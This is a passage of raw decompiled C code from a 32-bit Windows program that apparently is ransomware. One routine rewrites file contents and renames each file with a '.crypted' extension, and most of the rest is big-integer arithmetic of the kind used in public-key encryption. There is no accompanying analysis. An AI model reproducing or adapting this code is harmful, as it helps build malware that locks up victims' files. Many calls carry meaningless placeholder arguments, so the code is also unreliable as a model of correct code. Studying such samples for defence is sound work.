        int32_t * v86 = (int32_t *)(v64 - 96); // 0x401bc5
        *v86 = (int32_t)v85;
        HeapFree(&g266, (int32_t)&g266, &g266);
        int32_t v87 = v64 - 100; // 0x401bc8
        int32_t * v88 = (int32_t *)v87; // 0x401bc8
        *v88 = v78;
        *(int32_t *)(v64 - 104) = 0;
        *(int32_t *)(v64 - 108) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        *(int32_t *)(v64 - 112) = *v82;
        *(int32_t *)(v64 - 116) = 0;
        *(int32_t *)(v64 - 120) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        *(int32_t *)(v64 - 124) = *v83;
        *(int32_t *)(v64 - 128) = 0;
        *(int32_t *)(v64 - 132) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        int128_t v89 = __asm_xorps(v84, v84); // 0x401bef
        *(int32_t *)(v64 - 136) = 2;
        *(int32_t *)(v64 - 140) = 0;
        __asm_movlpd(*(int64_t *)v87, v89);
        *(int32_t *)(v64 - 144) = *v86;
        *(int32_t *)(v64 - 148) = *v88;
        *(int32_t *)(v64 - 152) = *hFile;
        SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
        *(int32_t *)(v64 - 156) = 0;
        *(int32_t *)(v64 - 160) = v81;
        *(int32_t *)(v64 - 164) = 260;
        *(int32_t *)(v64 - 168) = v64 + 64;
        v7 = v64 - 172;
        *(int32_t *)v7 = *hFile;
        WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        *(char *)(v64 - 149) = 1;
    }
    int32_t v90 = v7;
    int32_t v91 = v90 - 4; // 0x401c2d
    *(int32_t *)v91 = *hFile;
    CloseHandle(&g266);
    int32_t v92 = v91; // 0x401c3a
    if (*(char *)(v90 + 19) != 0) {
        // 0x401c3c
        *(int32_t *)(v90 - 8) = (int32_t)L".crypted";
        *(int32_t *)(v90 - 12) = 0;
        int32_t v93 = a1 + 4; // 0x401c43
        *(int32_t *)(v90 - 16) = v93;
        StrRStrIW((int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 20) = v93;
        *(int32_t *)(v90 - 24) = v90 + 0x12d0;
        lstrcpyW((int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 28) = (int32_t)L".crypted";
        *(int32_t *)(v90 - 32) = v90 + 0x12c8;
        lstrcatW((int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 36) = v90 + 0x12c0;
        v92 = v90 - 40;
        *(int32_t *)v92 = v93;
        MoveFileW((int16_t *)&g266, (int16_t *)&g266);
    }
    int32_t * v94 = (int32_t *)(v92 - 4); // 0x401c81
    *v94 = 0x10004;
    int32_t * v95 = (int32_t *)(v92 - 8); // 0x401c86
    *v95 = a1;
    function_4060cb((int32_t)&g266);
    *v94 = 1;
    *v95 = (int32_t)&g239;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    int32_t v96 = v92 + 728; // 0x401ca8
    int32_t v97 = 0x1000; // 0x401ca8
    *(char *)v96 = 0;
    v97--;
    v96++;
    while (v97 != 0) {
        // 0x401cb0
        *(char *)v96 = 0;
        v97--;
        v96++;
    }
    int32_t v98 = v92 + 112; // 0x401cc0
    int32_t v99 = 92; // 0x401cc0
    *(char *)v98 = 0;
    v99--;
    v98++;
    while (v99 != 0) {
        // 0x401cc4
        *(char *)v98 = 0;
        v99--;
        v98++;
    }
    int32_t v100 = v92 + 208; // 0x401cdb
    int32_t v101 = 260; // 0x401cdb
    *(char *)v100 = 0;
    v101--;
    v100++;
    while (v101 != 0) {
        // 0x401ce0
        *(char *)v100 = 0;
        v101--;
        v100++;
    }
    // 0x401ceb
    return 0;
}

// Address range: 0x401d00 - 0x401d2a
int32_t function_401d00(void) {
    // 0x401d00
    if (g239 >= g238) {
        // 0x401d29
        return g238;
    }
    // 0x401d0d
    int32_t v1; // bp-4, 0x401d00
    int32_t v2 = &v1; // 0x401d0e
    v2 -= 4;
    *(int32_t *)v2 = 0x1388;
    Sleep((int32_t)&g266);
    while (g239 < g238) {
        // 0x401d14
        v2 -= 4;
        *(int32_t *)v2 = 0x1388;
        Sleep((int32_t)&g266);
    }
    // 0x401d29
    return g238;
}

// Address range: 0x401d30 - 0x401d47
int32_t function_401d30(int32_t a1) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x401d3f
    return (int32_t)v1;
}

// Address range: 0x401d50 - 0x401d6a
int32_t function_401d50(int32_t a1, int32_t a2) {
    int32_t * v1 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x401d62
    return (int32_t)v1;
}

// Address range: 0x401d70 - 0x401d87
int32_t function_401d70(int32_t a1) {
    // 0x401d70
    return HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
}

// Address range: 0x401d90 - 0x401e27
int32_t function_401d90(uint32_t a1, int32_t a2, uint32_t a3) {
    int32_t result = 0; // 0x401da8
    int32_t v1; // 0x401d90
    int32_t v2; // 0x401d90
    if (a3 >= 1) {
        int32_t v3 = a3; // 0x401dbb
        int32_t v4 = 0; // 0x401dbb
        int32_t v5 = a2; // 0x401dbb
        uint32_t v6 = *(int32_t *)(v1 - a2 + v5); // 0x401dc5
        uint32_t v7 = *(int32_t *)v5 + v4; // 0x401dc9
        v4 = (int32_t)(v7 < v4) + (int32_t)(v6 < v7);
        v3--;
        *(int32_t *)(v2 - a2 + v5) = v6 - v7;
        v5 += 4;
        result = v4;
        while (v3 != 0) {
            // 0x401dc0
            v6 = *(int32_t *)(v1 - a2 + v5);
            v7 = *(int32_t *)v5 + v4;
            v4 = (int32_t)(v7 < v4) + (int32_t)(v6 < v7);
            v3--;
            *(int32_t *)(v2 - a2 + v5) = v6 - v7;
            v5 += 4;
            result = v4;
        }
    }
    // 0x401df1
    if (a1 <= a3) {
        // 0x401e20
        return result;
    }
    int32_t result2 = result; // 0x401e02
    int32_t v8 = v2 + 4 * a3; // 0x401e02
    int32_t v9 = 0; // 0x401e02
    uint32_t v10 = *(int32_t *)(v1 - v2 + v8); // 0x401e05
    *(int32_t *)v8 = v10 - result2;
    v9++;
    result2 = v10 < result2;
    v8 += 4;
    while (v9 < a1 - a3) {
        // 0x401e05
        v10 = *(int32_t *)(v1 - v2 + v8);
        *(int32_t *)v8 = v10 - result2;
        v9++;
        result2 = v10 < result2;
        v8 += 4;
    }
    // 0x401e20
    return result2;
}

// Address range: 0x401e30 - 0x401ec7
int32_t function_401e30(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a2 & 0xffff; // 0x401e3b
    uint32_t v2 = a2 / 0x10000; // 0x401e3e
    int32_t result = 0; // 0x401e4f
    int32_t v3 = a1; // 0x401e4f
    int32_t v4; // 0x401e30
    uint32_t v5 = *(int32_t *)v4; // 0x401e52
    int32_t v6 = v5 & 0xffff; // 0x401e56
    uint32_t v7 = v5 / 0x10000; // 0x401e5c
    uint32_t v8 = v7 * v1; // 0x401e5f
    uint32_t v9 = v6 * v1; // 0x401e67
    int32_t v10 = v7 * v2; // 0x401e6c
    uint32_t v11 = v6 * v2 + v8 + v9 / 0x10000; // 0x401e7e
    uint32_t v12 = (v9 & 0xffff) + result + 0x10000 * v11; // 0x401e8e
    result = (v11 >= v8 ? v10 : v10 + 0x10000) + v11 / 0x10000 + (int32_t)(v12 < result);
    int32_t v13; // 0x401e30
    *(int32_t *)v13 = v12;
    v3--;
    v13 += 4;
    v4 += 4;
    while (v3 != 0) {
        // 0x401e52
        v5 = *(int32_t *)v4;
        v6 = v5 & 0xffff;
        v7 = v5 / 0x10000;
        v8 = v7 * v1;
        v9 = v6 * v1;
        v10 = v7 * v2;
        v11 = v6 * v2 + v8 + v9 / 0x10000;
        v12 = (v9 & 0xffff) + result + 0x10000 * v11;
        result = (v11 >= v8 ? v10 : v10 + 0x10000) + v11 / 0x10000 + (int32_t)(v12 < result);
        *(int32_t *)v13 = v12;
        v3--;
        v13 += 4;
        v4 += 4;
    }
    // 0x401ec0
    return result;
}

// Address range: 0x401ed0 - 0x401f82
int32_t function_401ed0(int32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a2 & 0xffff; // 0x401ede
    uint32_t v2 = a2 / 0x10000; // 0x401ee3
    int32_t result = 0; // 0x401efb
    int32_t v3 = a1; // 0x401efb
    int32_t v4; // 0x401ed0
    int32_t v5; // 0x401ed0
    int32_t v6; // 0x401ed0
    uint32_t v7 = *(int32_t *)(v5 - v6 + v4); // 0x401f00
    int32_t v8 = v7 & 0xffff; // 0x401f08
    uint32_t v9 = v8 * v1; // 0x401f0b
    uint32_t v10 = v7 / 0x10000; // 0x401f11
    uint32_t v11 = v10 * v1; // 0x401f14
    int32_t v12 = v10 * v2; // 0x401f17
    uint32_t v13 = v8 * v2 + v11 + v9 / 0x10000; // 0x401f21
    uint32_t v14 = (v9 & 0xffff) + result + 0x10000 * v13; // 0x401f3a
    int32_t v15 = v13 >= v11 ? v12 : v12 + 0x10000; // 0x401f41
    int32_t * v16 = (int32_t *)v4; // 0x401f56
    uint32_t v17 = *v16;
    *v16 = v17 - v14;
    result = v15 + v13 / 0x10000 + (int32_t)(v14 < result) + (int32_t)(v17 < v14);
    v3--;
    v4 += 4;
    while (v3 != 0) {
        // 0x401f00
        v7 = *(int32_t *)(v5 - v6 + v4);
        v8 = v7 & 0xffff;
        v9 = v8 * v1;
        v10 = v7 / 0x10000;
        v11 = v10 * v1;
        v12 = v10 * v2;
        v13 = v8 * v2 + v11 + v9 / 0x10000;
        v14 = (v9 & 0xffff) + result + 0x10000 * v13;
        v15 = v13 >= v11 ? v12 : v12 + 0x10000;
        v16 = (int32_t *)v4;
        v17 = *v16;
        *v16 = v17 - v14;
        result = v15 + v13 / 0x10000 + (int32_t)(v14 < result) + (int32_t)(v17 < v14);
        v3--;
        v4 += 4;
    }
    // 0x401f79
    return result;
}

// Address range: 0x401f90 - 0x4020a2
int32_t function_401f90(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401f90
    int32_t v1; // 0x401f90
    int32_t v2; // 0x401f90
    int32_t v3; // 0x401f90
    int32_t v4 = function_401e30(a1, *(int32_t *)a2, v1, v2, v3); // 0x401fa5
    int32_t v5 = 4 * a1; // 0x401fb6
    int32_t v6; // 0x401f90
    *(int32_t *)(v6 + v5) = v4;
    int32_t v7 = v6 + 4; // 0x401fb9
    int32_t v8 = a3 - 1; // 0x401fbf
    if (v8 < 1) {
        // 0x402097
        return *(int32_t *)(v5 - 4 + v7);
    }
    int32_t v9 = a2; // 0x401fd1
    int32_t v10 = v8; // 0x401fd1
    int32_t v11 = v7; // 0x401fd1
    int32_t v12; // 0x401f90
    int32_t v13 = v12 - v7; // 0x401fd1
    v9 += 4;
    uint32_t v14 = *(int32_t *)v9; // 0x401fd4
    int32_t v15 = v14 & 0xffff; // 0x401fe0
    uint32_t v16 = v14 / 0x10000; // 0x401ff0
    int32_t v17 = a1; // 0x401ff0
    int32_t v18 = v11; // 0x401ff0
    int32_t v19 = 0; // 0x401ff0
    uint32_t v20 = *(int32_t *)(v18 + v13); // 0x401ff3
    int32_t v21 = v20 & 0xffff; // 0x401ff8
    uint32_t v22 = v20 / 0x10000; // 0x401ffd
    uint32_t v23 = v21 * v15; // 0x402002
    uint32_t v24 = v22 * v15; // 0x402005
    int32_t v25 = v22 * v16; // 0x402008
    uint32_t v26 = v21 * v16 + v24 + v23 / 0x10000; // 0x402017
    uint32_t v27 = (v23 & 0xffff) + v19 + 0x10000 * v26; // 0x40202a
    int32_t v28 = v26 >= v24 ? v25 : v25 + 0x10000; // 0x40203a
    int32_t * v29 = (int32_t *)v18; // 0x402051
    uint32_t v30 = *v29;
    uint32_t v31 = v27 + v30; // 0x402051
    *v29 = v31;
    int32_t v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30); // 0x402061
    v17--;
    v18 += 4;
    v19 = v32;
    while (v17 != 0) {
        // 0x401ff3
        v20 = *(int32_t *)(v18 + v13);
        v21 = v20 & 0xffff;
        v22 = v20 / 0x10000;
        v23 = v21 * v15;
        v24 = v22 * v15;
        v25 = v22 * v16;
        v26 = v21 * v16 + v24 + v23 / 0x10000;
        v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
        v28 = v26 >= v24 ? v25 : v25 + 0x10000;
        v29 = (int32_t *)v18;
        v30 = *v29;
        v31 = v27 + v30;
        *v29 = v31;
        v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
        v17--;
        v18 += 4;
        v19 = v32;
    }
    // 0x40206f
    *(int32_t *)(v11 + v5) = v32;
    v11 += 4;
    v10--;
    v13 -= 4;
    while (v10 != 0) {
        // 0x401fd4
        v9 += 4;
        v14 = *(int32_t *)v9;
        v15 = v14 & 0xffff;
        v16 = v14 / 0x10000;
        v17 = a1;
        v18 = v11;
        v19 = 0;
        v20 = *(int32_t *)(v18 + v13);
        v21 = v20 & 0xffff;
        v22 = v20 / 0x10000;
        v23 = v21 * v15;
        v24 = v22 * v15;
        v25 = v22 * v16;
        v26 = v21 * v16 + v24 + v23 / 0x10000;
        v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
        v28 = v26 >= v24 ? v25 : v25 + 0x10000;
        v29 = (int32_t *)v18;
        v30 = *v29;
        v31 = v27 + v30;
        *v29 = v31;
        v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
        v17--;
        v18 += 4;
        v19 = v32;
        while (v17 != 0) {
            // 0x401ff3
            v20 = *(int32_t *)(v18 + v13);
            v21 = v20 & 0xffff;
            v22 = v20 / 0x10000;
            v23 = v21 * v15;
            v24 = v22 * v15;
            v25 = v22 * v16;
            v26 = v21 * v16 + v24 + v23 / 0x10000;
            v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
            v28 = v26 >= v24 ? v25 : v25 + 0x10000;
            v29 = (int32_t *)v18;
            v30 = *v29;
            v31 = v27 + v30;
            *v29 = v31;
            v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
            v17--;
            v18 += 4;
            v19 = v32;
        }
        // 0x40206f
        *(int32_t *)(v11 + v5) = v32;
        v11 += 4;
        v10--;
        v13 -= 4;
    }
    // 0x402097
    return *(int32_t *)(v5 - 4 + v11);
}

// Address range: 0x4020b0 - 0x40212a
int32_t function_4020b0(int32_t a1, int32_t a2) {
    int32_t v1 = 4 * a1; // 0x4020bf
    int32_t v2; // 0x4020b0
    int32_t v3 = v1 - 4 + v2; // 0x4020c6
    int32_t v4; // 0x4020b0
    int32_t v5 = v4 + v1; // 0x4020c8
    uint32_t v6 = *(int32_t *)v3; // 0x4020d6
    uint32_t v7 = -a2 & 31; // 0x4020da
    int32_t result = v6 >> v7;
    uint32_t v8 = a2 & 31; // 0x4020df
    int32_t v9 = v6 << v8;
    int32_t v10 = a1 - 1; // 0x4020e1
    int32_t v11 = v10; // 0x4020ea
    int32_t v12 = v3; // 0x4020ea
    if (v10 == 0) {
        // 0x40211e
        *(int32_t *)(v5 - 4) = v9;
        return result;
    }
    int32_t v13 = v5;
    v12 -= 4;
    uint32_t v14 = *(int32_t *)v12; // 0x4020f0
    int32_t v15 = v13 - 4; // 0x4020f9
    *(int32_t *)v15 = v14 >> v7 | v9;
    int32_t v16 = v14 << v8;
    v11--;
    while (v11 != 0) {
        // 0x4020f0
        v13 = v15;
        v12 -= 4;
        v14 = *(int32_t *)v12;
        v15 = v13 - 4;
        *(int32_t *)v15 = v14 >> v7 | v16;
        v16 = v14 << v8;
        v11--;
    }
    // 0x402111
    *(int32_t *)(v13 - 8) = v16;
    return result;
}

// Address range: 0x402130 - 0x402198
int32_t function_402130(int32_t a1, int32_t a2) {
    uint32_t v1 = -a2 & 31; // 0x40214f
    uint32_t v2; // 0x402130
    int32_t result = v2 << v1;
    uint32_t v3 = a2 & 31; // 0x402154
    int32_t v4 = v2 >> v3;
    int32_t v5 = a1 - 1; // 0x402156
    int32_t v6 = v5; // 0x40215d
    if (v5 == 0) {
        // 0x40218d
        int32_t v7; // 0x402130
        *(int32_t *)v7 = v4;
        return result;
    }
    int32_t v8; // 0x402130
    int32_t v9 = v8 + 4;
    uint32_t v10 = *(int32_t *)v9; // 0x402160
    int32_t v11; // 0x402130
    int32_t v12 = v11 + 4; // 0x402168
    *(int32_t *)v11 = v10 << v1 | v4;
    int32_t v13 = v10 >> v3;
    v6--;
    v11 = v12;
    while (v6 != 0) {
        // 0x402160
        v9 += 4;
        v10 = *(int32_t *)v9;
        v12 = v11 + 4;
        *(int32_t *)v11 = v10 << v1 | v13;
        v13 = v10 >> v3;
        v6--;
        v11 = v12;
    }
    // 0x402181
    *(int32_t *)v12 = v13;
    return result;
}

// Address range: 0x4021a0 - 0x40230a
int32_t function_4021a0(void) {
    // 0x4021a0
    uint32_t v1; // 0x4021a0
    uint32_t v2 = v1 ^ -1; // 0x4021b2
    uint32_t v3 = v1 / 0x10000; // 0x4021b4
    int32_t v4 = v2 / v3;
    uint32_t v5 = v4 * (v1 & 0xffff); // 0x4021c4
    int32_t v6 = 0x10000 * (v2 - v4 * v3) | 0xffff; // 0x4021cf
    int32_t v7 = v4; // 0x4021d7
    int32_t v8 = v6; // 0x4021d7
    if (v6 < v5) {
        uint32_t v9 = v6 + v1; // 0x4021d9
        v7 = v4 - 1;
        v8 = v9;
        if (v9 >= v1 && v9 < v5) {
            // 0x4021e4
            v7 = v4 - 2;
            v8 = v9 + v1;
        }
    }
    uint32_t v10 = v8 - v5; // 0x4021e7
    uint32_t v11 = v10 / 0x10000 * v7 + v10; // 0x4021f1
    uint32_t v12 = v11 / 0x10000; // 0x4021fb
    int32_t v13 = v12 + 1; // 0x402201
    uint32_t v14 = 0x10000 * v10 - v13 * v1 + 0xffff;
    uint32_t v15 = (v14 < 0x10000 * v11 ? 0 : v1) + v14;
    int32_t v16 = v14 < 0x10000 * v11 ? v13 : v12; // 0x402226
    int32_t result = v16 + 0x10000 * v7 + (int32_t)(v15 >= v1); // 0x402234
    uint32_t v17; // 0x4021a0
    if (v17 == 0) {
        // 0x4022f7
        return result;
    }
    uint32_t v18 = v17 + (v15 ^ -1) + (v15 < v1 ? 0 : v1); // 0x40224d
    int32_t v19 = v18; // 0x402257
    int32_t result2 = result; // 0x402257
    if (v18 < v17) {
        // 0x402259
        v19 = v18 - v1 + (v18 < v1 ? 0 : -v1);
        result2 = result - 2 + (int32_t)(v18 < v1);
    }
    int32_t v20 = v17 & 0xffff; // 0x402273
    int32_t v21 = result2 & 0xffff; // 0x402278
    uint32_t v22 = v17 / 0x10000; // 0x40227d
    uint32_t v23 = v21 * v20;
    uint32_t v24 = result2 / 0x10000; // 0x402283
    uint32_t v25 = v21 * v22;
    int32_t v26 = v24 * v22;
    uint32_t v27 = v24 * v20 + v25 + v23 / 0x10000; // 0x40229c
    uint32_t v28 = (v27 >= v25 ? v26 : v26 + 0x10000) + v27 / 0x10000; // 0x4022b4
    uint32_t v29 = v28 + v19; // 0x4022b6
    if (v29 >= v28) {
        // 0x4022f7
        return result2;
    }
    int32_t v30 = v17 < (0x10000 * v27 | v23 & 0xffff) == v29 == v1 | v29 > v1 ? -2 : -1; // 0x4022ed
    return v30 + result2;
}

// Address range: 0x402310 - 0x4023e4
int32_t function_402310(int32_t a1, int32_t a2) {
    int32_t v1 = 0; // 0x40232a
    int32_t v2 = 0; // 0x40232a
    int32_t v3; // 0x402310
    uint32_t v4; // 0x402310
    if (v4 < 0x1000000) {
        int32_t v5; // 0x402310
        int32_t v6 = v5;
        int32_t v7 = 256 * v6; // 0x402330
        v1 += 8;
        v3 = v7;
        v2 = v1;
        while ((v6 & 0xff0000) == 0) {
            // 0x402330
            v6 = v7;
            v7 = 256 * v6;
            v1 += 8;
            v3 = v7;
            v2 = v1;
        }
    }
    int32_t v8 = v3; // 0x40233f
    int32_t v9 = v2; // 0x40233f
    int32_t v10 = v2; // 0x40233f
    if (v3 >= 0) {
        v9++;
        v8 *= 2;
        v10 = v9;
        while (v8 >= 0) {
            // 0x402341
            v9++;
            v8 *= 2;
            v10 = v9;
        }
    }
    uint32_t v11 = v4 << (v10 & 31);
    int32_t result; // 0x402310
    *(int32_t *)result = v10;
    uint32_t v12 = v11 ^ -1; // 0x40234c
    *(int32_t *)(result + 4) = v11;
    uint32_t v13 = v11 / 0x10000; // 0x402355
    int32_t v14 = v12 / v13;
    uint32_t v15 = (v11 & 0xffff) * v14; // 0x402363
    int32_t v16 = 0x10000 * (v12 - v14 * v13) | 0xffff; // 0x40236e
    int32_t v17 = v14; // 0x402376
    int32_t v18 = v16; // 0x402376
    if (v16 < v15) {
        uint32_t v19 = v16 + v11; // 0x402378
        v17 = v14 - 1;
        v18 = v19;
        if (v19 >= v11 && v19 < v15) {
            // 0x402383
            v17 = v14 - 2;
            v18 = v19 + v11;
        }
    }
    uint32_t v20 = v18 - v15; // 0x402386
    uint32_t v21 = v20 / 0x10000 * v17 + v20; // 0x402390
    uint32_t v22 = v21 / 0x10000; // 0x40239a
    int32_t v23 = v22 + 1; // 0x40239d
    uint32_t v24 = 0x10000 * v20 - v23 * v11 + 0xffff; // 0x4023a8
    int32_t v25 = v24 < 0x10000 * v21 ? 0 : v11;
    int32_t v26 = v24 < 0x10000 * v21 ? v23 : v22; // 0x4023c5
    *(int32_t *)(result + 12) = v26 + 0x10000 * v17 + (int32_t)(v25 + v24 >= v11);
    return result;
}

// Address range: 0x4023f0 - 0x4024ee
int32_t function_4023f0(int32_t a1) {
    // 0x4023f0
    if (a1 == 1) {
        // 0x402404
        int32_t v1; // 0x4023f0
        int32_t v2; // 0x4023f0
        return function_402310(v1, v2);
    }
    uint32_t v3; // 0x4023f0
    int32_t v4; // 0x4023f0
    if (a1 == 2) {
        int32_t v5 = *(int32_t *)(v3 + 4); // 0x40241b
        int32_t v6 = 0; // 0x402426
        int32_t v7 = v5; // 0x402426
        int32_t v8 = 0; // 0x402426
        if (v5 < 0x1000000) {
            int32_t v9 = v5;
            int32_t v10 = 256 * v9; // 0x402430
            v6 += 8;
            v7 = v10;
            v8 = v6;
            while ((v9 & 0xff0000) == 0) {
                // 0x402430
                v9 = v10;
                v10 = 256 * v9;
                v6 += 8;
                v7 = v10;
                v8 = v6;
            }
        }
        int32_t v11 = v7; // 0x40243f
        int32_t v12 = v8; // 0x40243f
        int32_t v13 = v8; // 0x40243f
        if (v7 >= 0) {
            v12++;
            v11 *= 2;
            v13 = v12;
            while (v11 >= 0) {
                // 0x402441
                v12++;
                v11 *= 2;
                v13 = v12;
            }
        }
        // 0x402446
        *(int32_t *)v4 = v13;
        int32_t v14 = v5; // 0x40244a
        int32_t v15; // 0x4023f0
        if (v13 != 0) {
            uint32_t v16 = v13 & 31; // 0x402459
            v15 = v3 << v16;
            v14 = v5 << v16 | v3 >> (-v13 & 31);
        }
        // 0x40245f
        *(int32_t *)(v4 + 4) = v14;
        *(int32_t *)(v4 + 8) = v15;
        int32_t result = function_4021a0(); // 0x402467
        *(int32_t *)(v4 + 12) = result;
        return result;
    }
    int32_t v17 = v3 + 4 * a1;
    int32_t v18 = *(int32_t *)(v17 - 4); // 0x402476
    uint32_t v19 = *(int32_t *)(v17 - 8); // 0x40247a
    int32_t v20 = v18; // 0x40248c
    int32_t v21 = 0; // 0x40248c
    if (v18 < 0x1000000) {
        int32_t v22 = v18;
        int32_t v23 = 256 * v22; // 0x402490
        int32_t v24 = 8; // 0x402493
        int32_t v25 = v24; // 0x40249b
        v20 = v23;
        v21 = v24;
        while ((v22 & 0xff0000) == 0) {
            // 0x402490
            v22 = v23;
            v23 = 256 * v22;
            v24 = v25 + 8;
            v25 = v24;
            v20 = v23;
            v21 = v24;
        }
    }
    int32_t v26 = v21; // 0x40249f
    if (v20 >= 0) {
        int32_t v27 = v21 + 1; // 0x4024a1
        int32_t v28 = 2 * v20; // 0x4024a2
        int32_t v29 = v28; // 0x4024a4
        int32_t v30 = v27; // 0x4024a4
        v26 = v27;
        while (v28 >= 0) {
            // 0x4024a1
            v27 = v30 + 1;
            v28 = 2 * v29;
            v29 = v28;
            v30 = v27;
            v26 = v27;
        }
    }
    // 0x4024a6
    *(int32_t *)v4 = v26;
    int32_t v31 = v18; // 0x4024aa
    int32_t v32 = v19; // 0x4024aa
    if (v26 != 0) {
        uint32_t v33 = -v26 & 31; // 0x4024b8
        uint32_t v34 = v26 & 31; // 0x4024bc
        v31 = v18 << v34 | v19 >> v33;
        v32 = *(int32_t *)(v17 - 12) >> v33 | v19 << v34;
    }
    // 0x4024d9
    *(int32_t *)(v4 + 4) = v31;
    *(int32_t *)(v4 + 8) = v32;
    int32_t result2 = function_4021a0(); // 0x4024df
    *(int32_t *)(v4 + 12) = result2;
    return result2;
}

// Address range: 0x4024f0 - 0x402656
int32_t function_4024f0(uint32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40250c
    int32_t v2 = 0; // 0x40250f
    int32_t v3; // bp-56, 0x4024f0
    int32_t * v4 = &v3; // 0x40250f
    int32_t v5 = 0; // 0x40250f
    int32_t v6; // 0x4024f0
    if (*v1 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x40251b
        int32_t v7 = (int32_t)hHeap; // bp-68, 0x402521
        v2 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        v5 = function_4020b0(a1, *v1);
        v6 = v2;
        v4 = &v7;
    }
    uint32_t v8 = *(int32_t *)(a2 + 4); // 0x402547
    uint32_t v9 = *(int32_t *)(a2 + 12); // 0x40254d
    int32_t v10 = v5; // 0x402558
    if (a1 >= 1) {
        int32_t v11 = v9 & 0xffff; // 0x402560
        uint32_t v12 = v9 / 0x10000; // 0x402563
        int32_t v13 = a1; // 0x402571
        int32_t v14; // 0x4024f0
        int32_t v15 = v14 + 4 * a1 - 4; // 0x402574
        int32_t v16 = v5 & 0xffff; // 0x402577
        uint32_t v17 = v5 / 0x10000; // 0x402588
        uint32_t v18 = v17 * v11; // 0x40258b
        int32_t v19 = v17 * v12; // 0x40258e
        uint32_t v20 = v16 * v11; // 0x402597
        uint32_t v21 = v16 * v12 + v18 + v20 / 0x10000; // 0x4025a7
        uint32_t v22 = 0x10000 * v21 | v20 & 0xffff; // 0x4025b5
        int32_t v23 = *(int32_t *)(v6 - v14 + v15); // 0x4025ba
        uint32_t v24 = v22 + v23; // 0x4025c6
        int32_t v25 = v21 / 0x10000 + v5 + (v21 >= v18 ? v19 : v19 + 0x10000) + (v24 < v22 ? 2 : 1); // 0x4025e3
        uint32_t v26 = v23 - v25 * v8; // 0x4025f1
        int32_t v27 = v24 < v26; // 0x4025f5
        uint32_t v28 = (v8 & v27) + v26; // 0x4025ff
        if (v14 != 0) {
            // 0x402613
            *(int32_t *)v15 = v25 + v27 + (int32_t)(v28 >= v8);
        }
        // 0x402620
        v13--;
        int32_t v29 = v28 - (v28 < v8 ? 0 : v8); // 0x402607
        int32_t v30 = v15; // 0x402628
        v10 = v29;
        while (v13 >= 0 == (v13 != 0)) {
            // 0x402574
            v15 = v30 - 4;
            v16 = v29 & 0xffff;
            v17 = v29 / 0x10000;
            v18 = v17 * v11;
            v19 = v17 * v12;
            v20 = v16 * v11;
            v21 = v16 * v12 + v18 + v20 / 0x10000;
            v22 = 0x10000 * v21 | v20 & 0xffff;
            v23 = *(int32_t *)(v6 - v14 + v15);
            v24 = v22 + v23;
            v25 = v21 / 0x10000 + v29 + (v21 >= v18 ? v19 : v19 + 0x10000) + (v24 < v22 ? 2 : 1);
            v26 = v23 - v25 * v8;
            v27 = v24 < v26;
            v28 = (v8 & v27) + v26;
            if (v14 != 0) {
                // 0x402613
                *(int32_t *)v15 = v25 + v27 + (int32_t)(v28 >= v8);
            }
            // 0x402620
            v13--;
            v29 = v28 - (v28 < v8 ? 0 : v8);
            v30 = v15;
            v10 = v29;
        }
    }
    int32_t v31 = 0; // 0x402635
    if (*v1 != 0) {
        int32_t v32 = (int32_t)v4;
        *(int32_t *)(v32 - 4) = v2;
        *(int32_t *)(v32 - 8) = 0;
        *(int32_t *)(v32 - 12) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        v31 = *v1 & 31;
    }
    // 0x40264b
    return v10 >> v31;
}

// Address range: 0x402660 - 0x4026ec
int32_t function_402660(int32_t a1) {
    // 0x402660
    uint32_t v1; // 0x402660
    int32_t v2; // 0x402660
    if (v2 == 0) {
        // 0x4026e5
        return v1 & 1;
    }
    int32_t v3 = (uint32_t)(v1 / 2);
    int32_t v4 = a1 - 1; // 0x4026b1
    int32_t v5 = v3; // 0x4026b4
    int32_t v6; // 0x402660
    if (v4 != 0) {
        int32_t v7 = v4; // 0x4026be
        int32_t v8; // 0x402660
        int32_t v9 = v8 + 4;
        uint32_t v10 = *(int32_t *)(v1 - v2 + v9); // 0x4026c0
        *(int32_t *)v8 = 0x80000000 * v10 | v3;
        int32_t v11 = v10 / 2;
        v7--;
        v8 = v9;
        v6 = v9;
        v5 = v11;
        while (v7 != 0) {
            // 0x4026c0
            v9 = v8 + 4;
            v10 = *(int32_t *)(v1 - v2 + v9);
            *(int32_t *)v8 = 0x80000000 * v10 | v11;
            v11 = v10 / 2;
            v7--;
            v8 = v9;
            v6 = v9;
            v5 = v11;
        }
    }
    // 0x4026e0
    *(int32_t *)v6 = v5;
    // 0x4026e5
    return v1 & 1;
}

// Address range: 0x4026f0 - 0x402935
